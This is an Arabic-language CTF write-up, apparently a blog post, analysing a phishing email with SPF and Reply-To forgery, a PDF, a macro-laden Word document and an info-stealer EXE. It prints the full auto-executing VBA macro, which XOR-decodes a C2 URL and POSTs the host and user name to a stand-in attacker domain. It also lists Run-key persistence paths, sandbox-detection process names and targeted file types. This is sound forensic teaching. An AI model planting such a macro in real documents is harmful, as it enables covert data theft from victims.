+    <span class="md-ellipsis">
+      
+        Q29 — SHA256 of VBA Macro File
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q30-sha256-of-info-stealer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q30 — SHA256 of Info-Stealer
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ioc-report" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        خلاصة — IOC Report
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#investigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ملاحظات للـ Investigation الحقيقي
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="dphish-phishing-email-analysis">DPhish — Phishing Email Analysis</h1>
+<!-- more -->
+<div class="rtl-content">
+<blockquote>
+<p><em>بسم الله في حوار جديد في الـ Cyber Security</em></p>
+<p><em>متأخر جداً عارفه، بس ده ميغنيش إنه فرصة ممتازة عشان نتعلم الـ Email Analysis. حتى أنا نفسي اتعلمت من أسبوعين — كان في CTF اسمه DPhish، كانت عبارة عن Phishing Email نعمله Analysis ونجاوب على 30 سؤال. الحمد لله كنت حليت الـ 30 سؤال واتأهلت، بس مقدرتش أحضر النهائيات.</em></p>
+<p><em>هنحل التشالنج وفي نفس الوقت هنفكر بتفكير الـ Forensics Engineer العادي.</em></p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/0*ODZHF09ssmjOxd8b.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/0*ODZHF09ssmjOxd8b.png"></a></p>
+<h2 id="challenge-description">Challenge Description</h2>
+<p>اسم الملف: <code>challenge.eml</code></p>
+<p>DPhish — Phishing Email Analysis</p>
+<p>You are a SOC analyst at ByPaid Solutions. An employee named Babar has reported a suspicious email they received from the HR department.</p>
+<p>Your job is to investigate this email thoroughly:</p>
+<ul>
+<li>Analyze the email headers to trace the true origin of this message</li>
+<li>Examine all attachments — some may contain malicious content, and not all of them are immediately visible</li>
+<li>Investigate the linked website referenced in the email body</li>
+<li>Reverse-engineer any binaries or macros found in the attachments</li>
+</ul>
+<p>Rules:</p>
+<ul>
+<li>All analysis must be performed in an isolated VM/sandbox environment</li>
+<li>Answers are case-insensitive</li>
+<li>Some questions have limited attempts — read carefully before submitting</li>
+<li>Hints are available but cost 100 points each</li>
+</ul>
+<h2 id="_1">البداية — فتح الملف</h2>
+<p>هنبدأ إننا نفتحه على VM معزولة، عشان ممكن يكون في مالوير في صور ولما نفتح الميل بيرن، فا عشان نكون حذرين.</p>
+<div class="highlight"><pre><span></span><code>cat challenge.eml
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:695/0*-j_boqBx85W01HKM.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:695/0*-j_boqBx85W01HKM.png"></a></p>
+<h2 id="warm-up-subject-line">Warm-up: Subject Line</h2>
+<p>Question: What is the subject line of the phishing email?</p>
+<p>Answer: <code>Urgent: Employee Salary Revision and Policy</code></p>
+<h2 id="phase-1-email-headers-analysis">Phase 1 — Email Headers Analysis</h2>
+<h2 id="q1-mail-gateway-hostname">Q1 — Mail Gateway Hostname</h2>
+<p>Question: What is the hostname of the mail gateway that actually sent this email? (found in the Received header)</p>
+<p>لو خدت بالك في الـ Received header هتلاقي:</p>
+<div class="highlight"><pre><span></span><code>Received: from mail.evil.owndomain.online by mx.bf456
+</code></pre></div>
+<p>يعني هو في الأصل من <code>mail.evil.owndomain.online</code> وحد أخده سلّمه للـ domain المخبّي — ده السيرفر الأساسي للهاكر والذي يستضيف الـ domain الظاهر في الـ <code>From</code> فوق.</p>
+<blockquote>
+<p><em>المهاجم يقدر يزوّر</em> <code>&lt;em class="hh"&gt;From: hr@bypaid.io&lt;/em&gt;</code> <em>بسهولة، لكن الـ Received headers بتُضافها كل mail server في الطريق — وده أصعب تزويره بكتير.</em></p>
+</blockquote>
+<p><strong>Press enter or click to view image in full size</strong><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/0*WA-87_wslvIAeQD1.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/0*WA-87_wslvIAeQD1.png"></a></p>
+<p>Answer: <code>mail.evil.owndomain.online</code></p>
+<h2 id="q2-originating-ip-address">Q2 — Originating IP Address</h2>
+<p>Question: What is the originating IP address of the sender?</p>
+<p>الـ IP موجود جنب الـ hostname في نفس الـ Received header.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:351/0*iGxR0GwmmqdoCoqx.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:351/0*iGxR0GwmmqdoCoqx.png"></a></p>
+<p>Answer: <code>185.199.42.13</code></p>
+<h2 id="q3-spf-verification-result">Q3 — SPF Verification Result</h2>
+<p>Question: What is the SPF verification result for this email?</p>
+<p>ده واحد من أهم تلات بروتوكولات في الـ Header Analysis:</p>
+<p>البروتوكولالوظيفةSPFهل الـ IP مسموحله يبعت؟DKIMهل الإيميل اتوقّع رقمياً من الدومين؟DMARCلو SPF أو DKIM فشلوا، إيه اللي يحصل؟</p>
+<p>هو بيسأل عن SPF، فا الإجابة <code>softfail</code> — يعني إن الـ IP مشكوك فيه، بس الـ rules بتاعة الـ mail gateway عدّته في الـ spam.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:845/0*lg9EKqnF6un8wlbX.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:845/0*lg9EKqnF6un8wlbX.png"></a></p>
+<p>Answer: <code>softfail</code></p>
+<h2 id="q4-reply-to-email-address">Q4 — Reply-To Email Address</h2>
+<p>Question: What is the Reply-To email address?</p>
+<p>في الطبيعي: <code>From == Reply-To</code></p>
+<p>بس في الميل ده لو ركّزت هتلاقي:</p>
+<div class="highlight"><pre><span></span><code>From:     hr@bypaid.io                        ← بيظهر شرعي للضحية
+Reply-To: hr-support@evil.owndomain.online    ← مخبي! 🚨
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:449/0*h1XD3b0r0FToHpj8.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:449/0*h1XD3b0r0FToHpj8.png"></a></p>
+<p>Answer: <code>hr-support@evil.owndomain.online</code></p>
+<h2 id="q5-mail-client-tool-used">Q5 — Mail Client / Tool Used</h2>
+<p>Question: What mail client or tool was used to send this email? (include version)</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:261/0*xdc85iakv0S4jQ4S.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:261/0*xdc85iakv0S4jQ4S.png"></a></p>
+<p>Answer: <code>PyMailer 3.2.1</code></p>
+<h2 id="q6-message-id-domain">Q6 — Message-ID Domain</h2>
+<p>Question: What is the domain found in the Message-ID header?</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:726/0*kUBYp68YVHTmonLA.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:726/0*kUBYp68YVHTmonLA.png"></a></p>
+<p>Answer: <code>evil.owndomain.online</code></p>
+<h2 id="phase-2-attachments-analysis">Phase 2 — Attachments Analysis</h2>
+<p>Q7 : What engine/tool was used to create the PDF file? (include version)</p>
+<p>طيب بيقولي التول الي عملت ال pdf</p>
+<p>اي pdf ?هو في ملفات في الميل؟لو عملت سكرول شويه كدا هتلاقي انالسيز ل</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:774/1*d8b1-J_FZGsA53fPX6w02Q.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:774/1*d8b1-J_FZGsA53fPX6w02Q.png"></a></p>
+<p>نص الميل نفسه</p>
+<p><strong>Press enter or click to view image in full size</strong><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/1*Jm_3rd91NF-CnjQMjFG5kA.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/1*Jm_3rd91NF-CnjQMjFG5kA.png"></a></p>
+<p>Salary_Report_2026.pdf</p>
+<p><strong>Press enter or click to view image in full size</strong><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/1*0_Jh9w8yg0HbbK_T-oAyfg.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/1*0_Jh9w8yg0HbbK_T-oAyfg.png"></a></p>
+<p>Policy_Update.doc</p>
+<p><strong>Press enter or click to view image in full size</strong><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/1*YNz2jGqOxgD3rLImnvZISw.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/1*YNz2jGqOxgD3rLImnvZISw.png"></a></p>
+<p>Meeting_Invite.ics</p>
+<p>Update_Tool.exe</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:851/1*9yidZEBpRrLawiPHrar9Cg.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:851/1*9yidZEBpRrLawiPHrar9Cg.png"></a></p>
+<p>text/html</p>
+<p>طيب عايزين نستخرجهم عشان نعرف اي دول</p>
+<h2 id="_2">استخراج الملفات</h2>
+<p>هنستخرج الملفات من الميل بسكريبت بسيط:</p>
+<div class="highlight"><pre><span></span><code>python3 &lt;&lt; 'EOF'
+import email
+with open('challenge.eml', 'rb') as f:
+    msg = email.message_from_binary_file(f)
+for part in msg.walk():
+    fn = part.get_filename()
+    # اسأل كل part: عندك اسم ملف؟
+    if fn:
+    # لو أيوه → ده attachment
+        data = part.get_payload(decode=True)
+        # get_payload(decode=True):
+        # - اجبلي محتوى الملف
+        # - decode=True: لو محتوى الملف مشفر بـ base64، افكّه أول
+        open(fn, 'wb').write(data)
+        # احفظ المحتوى في ملف باسمه الأصلي
+        # 'wb' = write + binary
+        print(f"✅ {fn} ({len(data):,} bytes)")
+EOF
+</code></pre></div>
+<p>الناتج:</p>
+<div class="highlight"><pre><span></span><code>✅ Policy_Update.doc       (35,840 bytes)
+✅ Meeting_Invite.ics      (760 bytes)
+✅ Update_Tool.exe         (490,496 bytes)
+✅ Salary_Report_2026.pdf  (2,764 bytes)
+</code></pre></div>
+<h2 id="_3">التحقق من الملفات</h2>
+<p>عايزين تفاصيل أكتر عن الملفات، وكمان نتأكد من الـ extensions بتاعتهم — لو في حاجة متغيرة أو double extension مثلاً:</p>
+<div class="highlight"><pre><span></span><code>file Policy_Update.doc Meeting_Invite.ics Update_Tool.exe Salary_Report_2026.pdf
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>Policy_Update.doc  → Composite Document File V2 Document  (= OLE format = Word قديم)
+Meeting_Invite.ics → ASCII text
+Update_Tool.exe    → PE32+ executable x86-64, for MS Windows
+Salary_Report.pdf  → PDF document, version 1.4
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:695/0*k64XQx17KH0VAnJm.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:695/0*k64XQx17KH0VAnJm.png"></a></p>
+<h2 id="phase-3-pdf-analysis">Phase 3 — PDF Analysis</h2>
+<h2 id="q7-pdf-creation-tool">Q7 — PDF Creation Tool</h2>
+<p>Question: What engine/tool was used to create the PDF file? (include version)</p>
+<p>بنستخدم <code>exiftool</code> عشان تظهرلنا كل الـ metadata بتاعت الملف:</p>
+<div class="highlight"><pre><span></span><code>exiftool Salary_Report_2026.pdf
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:695/0*6FU8upvaBgu-Hvyq.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:695/0*6FU8upvaBgu-Hvyq.png"></a></p>
+<p>هتلاقي في الـ Creator: <code>wkhtmltopdf 0.12.6</code> — وده tool بيحوّل صفحات الـ HTML إلى PDF.</p>
+<blockquote>
+<p><em>فرق مهم:</em></p>
+</blockquote>
+<ul>
+<li>Creator = البرنامج اللي عمل المحتوى الأصلي → <code>wkhtmltopdf</code> (أداة تحوّل HTML → PDF)</li>
+<li>Producer = الـ PDF library اللي أنشأت ملف الـ PDF نفسه → <code>ReportLab</code></li>
+</ul>
+<blockquote>
+<p><em>يعني المهاجم عمل صفحة HTML احترافية وحوّلها PDF.</em></p>
+</blockquote>
+<p>Answer: <code>wkhtmltopdf 0.12.6</code></p>
+<h2 id="q8-pdf-author">Q8 — PDF Author</h2>
+<p>Question: Who is listed as the Author in the PDF metadata?</p>
+<p>Answer: <code>dphish_admin</code></p>
+<h2 id="q9-pdf-producer">Q9 — PDF Producer</h2>
+<p>Question: What is the Producer listed in the PDF metadata? (include version)</p>
+<p>Answer: <code>ReportLab v4.1</code></p>
+<h2 id="q10-custom-reference-keyword">Q10 — Custom Reference Keyword</h2>
+<p>Question: What is the custom reference keyword hidden in the PDF metadata?</p>
+<blockquote>
+<p><em>ودي reference keyword بنستخدمها عشان الميلات اللي عندها رد تلقائي.</em></p>
+</blockquote>
+<p>Answer: <code>CTF-2026-PHISH</code></p>
+<h2 id="q11-employee-id">Q11 — Employee ID</h2>
+<p>Question: What is the Employee ID of the highlighted employee in the salary table?</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:695/0*rwzO5OmDNBCMiREK.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:695/0*rwzO5OmDNBCMiREK.png"></a></p>
+<p>Answer: <code>EMP-2026-4491</code></p>
+<h2 id="phase-4-vba-macro-analysis">Phase 4 — VBA Macro Analysis</h2>
+<h2 id="_4">كيف عرفنا إن في ماكرو؟</h2>
+<p>لو رجعنا لنتيجة الـ <code>file</code> command:</p>
+<div class="highlight"><pre><span></span><code>Policy_Update.doc → Composite Document File V2 Document (= OLE format = Word قديم)
+</code></pre></div>
+<p>الإصدارات القديمة كانوا بيستخدموا نفس الـ file extension اللي هو <code>.doc</code> للاتنين — على عكس الإصدارات الجديدة لـ Office إن الملف العادي <code>.docx</code> والماكرو <code>.docm</code>.</p>
+<p>كمان الـ command قالنا إنه OLE format — يعني إيه؟</p>
+<blockquote>
+<p><em>OLE = Object Linking and Embedding فورمات لـ structure بيجمع أنواع الداتا المختلفة في ملف واحد. فا في tool بتفك الـ structure ده وده اللي احنا محتاجينه.</em></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code>olevba Policy_Update.doc
+</code></pre></div>
+<p><strong>Press enter or click to view image in full size</strong><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/0*MJGLAeSx86AZl445.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/0*MJGLAeSx86AZl445.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:695/0*yzPLVTXUU9dCL5_2.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:695/0*yzPLVTXUU9dCL5_2.png"></a></p>
+<p>لو قرأت الجدول هتلاقي <code>AutoExec</code> — يبقى ماكرو. وكمان لو خدت بالك <code>MSXML2.XMLHTTP</code> ده السيرفر اللي بيتوصل بيه، وكمان <code>XOR</code> — وكده عرفنا إنه C2.</p>
+<h2 id="_5">كود الماكرو كامل</h2>
+<div class="highlight"><pre><span></span><code>'─────────────────────────────────────────────────────
+' الـ Triggers — بيشتغلوا لوحدهم لما الملف يتفتح
+'─────────────────────────────────────────────────────
+Sub AutoOpen()
+    InitUpdate          ' ← ينادي InitUpdate فوراً
+End Sub
+Sub Document_Open()     ' ← نفس الشيء للـ compatibility مع إصدارات مختلفة
+    InitUpdate
+End Sub
+'─────────────────────────────────────────────────────
+' الكود الحقيقي - InitUpdate هي الـ auto-execute subroutine
+'─────────────────────────────────────────────────────
+Sub InitUpdate()
+    Dim encodedUrl() As Variant
+    Dim xorKey As Byte
+    Dim decodedUrl As String
+    Dim i As Long
+    xorKey = &amp;H4D       ' الـ XOR key = 0x4D (= 77 decimal)
+    ' الـ URL مشفّر - مش ممكن تقراه مباشرة
+    encodedUrl = Array(&amp;H25, &amp;H39, &amp;H39, &amp;H3D, &amp;H77, &amp;H62, &amp;H62, &amp;H28, _
+                       &amp;H3B, &amp;H24, &amp;H21, &amp;H63, &amp;H22, &amp;H3A, &amp;H23, &amp;H29, _
+                       &amp;H22, &amp;H20, &amp;H2C, &amp;H24, &amp;H23, &amp;H63, &amp;H22, &amp;H23, _
+                       &amp;H21, &amp;H24, &amp;H23, &amp;H28, &amp;H62, &amp;H2C, &amp;H3D, &amp;H24, _
+                       &amp;H62, &amp;H2E, &amp;H22, &amp;H21, &amp;H21, &amp;H28, &amp;H2E, &amp;H39)
+    ' فك التشفير - XOR كل byte مع المفتاح
+    decodedUrl = ""
+    For i = LBound(encodedUrl) To UBound(encodedUrl)
+        decodedUrl = decodedUrl &amp; Chr(CLng(encodedUrl(i)) Xor xorKey)
+    Next i
+    ' اجمع بيانات الجهاز
+    Dim computerName As String
+    Dim userName As String
+    computerName = Environ("COMPUTERNAME")   ' اسم الجهاز
+    userName     = Environ("USERNAME")       ' اسم المستخدم
+    ' ابعت البيانات للـ C2 بـ HTTP POST
+    Dim objHTTP As Object
+    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
+    objHTTP.Open "POST", decodedUrl, False
+    objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+    objHTTP.send "host=" &amp; computerName &amp; "&amp;user=" &amp; userName
+    Set objHTTP = Nothing
+End Sub
+'─────────────────────────────────────────────────────
+' Dead Code - مكتوب بس مش بيتنادى من أي حتة!
+'─────────────────────────────────────────────────────
+Sub VerifyPolicy()
+    Dim policyHash As String
+    policyHash = "A1B2C3D4E5F6"    ' ← بيانات وهمية
+    Dim statusCode As Long
+    statusCode = 0
+End Sub
+</code></pre></div>
+<p>Start To Answer By this code</p>
+<h2 id="q12-xor-key">Q12 — XOR Key</h2>
+<p>Question: What is the XOR key used to obfuscate the URL in the macro? (hex format, e.g. 0xAB)</p>
+<p><a href="https://medium.com/write?source=promotion_paragraph---post_body_banner_better_place_blocks--06a7dc135714-----------------------------------------"><img alt="Write on Medium" src=""></a></p>
+<p>لو ركّزت في الكود هتلاقي: <code>xorKey = &amp;H4D</code></p>
+<p>Answer: <code>0x4D</code></p>
+<h2 id="q13-deobfuscated-c2-url">Q13 — Deobfuscated C2 URL</h2>
+<p>Question: What is the full deobfuscated C2 URL in the macro?</p>
+<p>هتلاقي في الكود الـ <code>encodedUrl</code> — حطيناه في CyberChef ورجع:</p>
+<p>encodedUrl = Array(&amp;H25, &amp;H39, &amp;H39, &amp;H3D, &amp;H77, &amp;H62, &amp;H62, &amp;H28, &amp;H3B, &amp;H24, &amp;H21, &amp;H63, &amp;H22, &amp;H3A, &amp;H23, &amp;H29, &amp;H22, &amp;H20, &amp;H2C, &amp;H24, &amp;H23, &amp;H63, &amp;H22, &amp;H23, &amp;H21, &amp;H24, &amp;H23, &amp;H28, &amp;H62, &amp;H2C, &amp;H3D, &amp;H24, &amp;H62, &amp;H2E, &amp;H22, &amp;H21, &amp;H21, &amp;H28, &amp;H2E, &amp;H39)</p>
+<p>Answer: <code>&lt;a class="as rg" href="http://evil.owndomain.online/api/collect" rel="noopener ugc nofollow" target="_blank"&gt;http://evil.owndomain.online/api/collect&lt;/a&gt;</code></p>
+<h2 id="q14-http-method">Q14 — HTTP Method</h2>
+<p>Question: What method does the macro use to send data to the C2?</p>
+<p>لو خدت بالك هتلاقي في الكود: <code>objHTTP.Open "POST"</code></p>
+<p>Answer: <code>POST</code></p>
+<h2 id="q15-auto-execute-subroutine">Q15 — Auto-execute Subroutine</h2>
+<p>Question: What is the name of the main auto-execute subroutine that performs the malicious action?</p>
+<p>اسم الـ function اللي لقينا فيها الـ URL كان <code>InitUpdate</code>.</p>
+<p>Answer: <code>InitUpdate</code></p>
+<h2 id="q16-dead-code-function">Q16 — Dead Code Function</h2>
+<p>Question: What is the name of the dead code function that is never called?</p>
+<blockquote>
+<p><em>Dead Code يعني كود محطوط بس عشان يبان legit، لكنه مش بيتنادى أبداً — أو بيتنادى بس مش function أساسية.</em></p>
+</blockquote>
+<p>هتلاقيها <code>VerifyPolicy</code>.</p>
+<p>Answer: <code>VerifyPolicy</code></p>
+<h2 id="q17-department-code">Q17 — Department Code</h2>
+<p>Question: What is the Department Code found in the document content?</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:695/0*3XUQgxCZ1oojpok_.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:695/0*3XUQgxCZ1oojpok_.png"></a></p>
+<p>Answer: <code>FIN-0042</code></p>
+<h2 id="phase-5-exe-binary-analysis">Phase 5 — EXE Binary Analysis</h2>
+<h2 id="q18-exe-c2-url">Q18 — EXE C2 URL</h2>
+<p>Question: What is the full C2 server URL used by the executable for data exfiltration?</p>
+<p>اللينك اللي فوق كان <code>/collect</code> وبيبعت بس الـ hostname + username. فا متوقع نلاقي حاجة تانية بتبعت كل الداتا.</p>
+<p>فاكر الـ tool اللي جاوبنا بيها في ملف قبل كده؟ <code>wkhtmltopdf</code> — وقلنا إنها بتحوّل HTML → PDF.</p>
+<div class="highlight"><pre><span></span><code>الـ Attacker بيعمل phishing PDF:
+  1. بيعمل HTML page تبان زي صفحة HR شرعية
+  2. بيحوّلها PDF بـ wkhtmltopdf
+  3. بيحط فيها رابط للموقع الوهمي
+  والـ Creator بيكون "wkhtmltopdf"
+</code></pre></div>
+<p>طب ما نشوف الـ PDF تاني — كانت نتيجة الـ <code>file</code> command: <code>PDF document, version 1.4</code>.</p>
+<p>مستفدناش أوي، طب نجرب نسحب كل الـ strings اللي في الـ binary؟</p>
+<blockquote>
+<p><em>الـ endstream مش رابط — ده جزء من بنية الـ PDF نفسه.</em></p>
+</blockquote>
+<p>طب نجرب الملف التاني — ملف الـ exe: <code>Update_Tool.exe</code></p>
+<p>مفيش حاجة واضحة في الـ metadata، ممكن نحطه على IDA لكن هنتأكد الأول من tool الـ strings سريعاً:</p>
+<div class="highlight"><pre><span></span><code>strings Update_Tool.exe
+</code></pre></div>
+<p><strong>Press enter or click to view image in full size</strong><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/0*NTqteqCL5YxCdmDr.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/0*NTqteqCL5YxCdmDr.png"></a></p>
+<p>اهو وكمان <code>/upload</code> — يبقى الإجابة:</p>
+<p>Answer: <code>&lt;a class="as rg" href="http://evil.owndomain.online/upload" rel="noopener ugc nofollow" target="_blank"&gt;http://evil.owndomain.online/upload&lt;/a&gt;</code></p>
+<h2 id="q19-registry-key-path">Q19 — Registry Key Path</h2>
+<p>Question: What is the full registry key path used for persistence?</p>
+<p>أشهر الـ registry keys في الـ Persistence:</p>
+<div class="highlight"><pre><span></span><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run      ← مش محتاج Admin
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run      ← محتاج Admin
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+</code></pre></div>
+<p>المفتاحالصلاحيةمتى يشتغلHKCUمش محتاج Adminكل startup للمستخدم الحاليHKLMمحتاج Adminكل startup لكل المستخدمينRun — كل startupRunOnce — مرة واحدة بس ثم يُمسح</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:585/0*2egaANl_p859EpHM.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:585/0*2egaANl_p859EpHM.png"></a></p>
+<p>هتلاقي: <code>Software\Microsoft\Windows\CurrentVersion\Run</code></p>
+<p>Answer: <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></p>
+<h2 id="q20-registry-value-name">Q20 — Registry Value Name</h2>
+<p>Question: What is the registry value name used for the persistence entry?</p>
+<blockquote>
+<p><em>إيه الفرق بين Key وValue؟</em></p>
+<p><code>&lt;em class="hh"&gt;Key = المجلد (HKCU\...\Run) Value = الـ entry جوّا المجلد HKCU\...\Run └── WindowsUpdateSvc = C:\...\Update_Tool.exe ↑ Value Name ↑ Value Data&lt;/em&gt;</code></p>
+</blockquote>
+<p>Answer: <code>WindowsUpdateSvc</code></p>
+<h2 id="q21-target-applications">Q21 — Target Applications</h2>
+<p>Question: Name the three applications whose data the malware targets (comma-separated, alphabetical order)</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:590/0*CdX6nX7vdcjdntk4.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:590/0*CdX6nX7vdcjdntk4.png"></a></p>
+<p>Answer: <code>Discord, Google Chrome, Mozilla Firefox</code></p>
+<h2 id="q22-user-agent-string">Q22 — User-Agent String</h2>
+<p>Question: What is the full User-Agent string used in HTTP requests by the malware?</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:503/0*OG-Q7fd4fyLffWZY.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:503/0*OG-Q7fd4fyLffWZY.png"></a></p>
+<p>Answer: <code>Mozilla/5.0 (compatible; UpdateService/1.0)</code></p>
+<h2 id="q23-mutex-name">Q23 — Mutex Name</h2>
+<p>Question: What is the mutex name created by the malware?</p>
+<blockquote>
+<p><em>الـ Mutex إيه؟</em></p>
+<p><em>Mutex = Mutual Exclusion = قفل</em></p>
+<p><em>لو في نسختين من المالوير بتشتغلوا مع بعض، ممكن يتعارضوا ويعملوا مشاكل. الـ Mutex بيمنع ده:</em></p>
+</blockquote>
+<ul>
+<li>النسخة الأولى بتعمل mutex باسم محدد</li>
+<li>النسخة التانية بتشوف الـ mutex موجود → تقفل نفسها</li>
+</ul>
+<p>في العادة بيكون اسم عشوائي وبتعرفه من الـ API اللي بيستخدمها زي <code>CreateMutex | OpenMutex | WaitForSingle</code>، بس في الكود معانا هنا لقيناه باسمه عادي:</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:639/0*ojNofPLP8zWySR3d.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:639/0*ojNofPLP8zWySR3d.png"></a></p>
+<p>Answer: <code>Global\DPhishMutex2026</code></p>
+<h2 id="q24-vmsandbox-detection">Q24 — VM/Sandbox Detection</h2>
+<p>Question: Name one process the malware checks for during VM/sandbox detection.</p>
+<p>أول حاجة المالوير بيفحصها عشان يتأكد إنه في بيئة عادية أو sandbox، بيبص على أسماء زي:</p>
+<div class="highlight"><pre><span></span><code>vbox | vmware | sandbox | qemu | procmon | wireshark
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:505/0*H0NfQBWAhUcFyghT.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:505/0*H0NfQBWAhUcFyghT.png"></a></p>
+<p>Answer: <code>vmtoolsd.exe</code></p>
+<h2 id="q25-target-file-extensions">Q25 — Target File Extensions</h2>
+<p>Question: What file extensions does the malware search for? (comma-separated, alphabetical)</p>
+<div class="highlight"><pre><span></span><code>.dat    ← ملفات بيانات المتصفح (cookies, credentials)
+.txt    ← ملفات نصية ممكن فيها passwords أو notes
+.wallet ← Cryptocurrency wallet files
+</code></pre></div>
+<p><strong>Press enter or click to view image in full size</strong><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:875/0*P6XdVBy98mGv7yS7.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:875/0*P6XdVBy98mGv7yS7.png"></a></p>
+<p>Answer: <code>.dat,.txt,.wallet</code></p>
+<h2 id="phase-6-phishing-website">Phase 6 — Phishing Website</h2>
+<h2 id="q26-verification-pin">Q26 — Verification PIN</h2>
+<p>Question: What is the Verification PIN?</p>
+<p>هنبدأ نشوف الـ link بتاع الـ phishing بيقول إيه — كل ده على الـ sandbox.</p>
+<p>هلاقي صفحة زي تسجيل دخول، ومتوقع للـ scenario اللي معانا إنه ممكن يقصد الـ user اللي كان معمول عليه highlight.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://miro.medium.com/v2/resize:fit:695/0*vWXbisG9cR8A94xL.png" data-desc-position="bottom"><img alt="" src="https://miro.medium.com/v2/resize:fit:695/0*vWXbisG9cR8A94xL.png"></a></p>
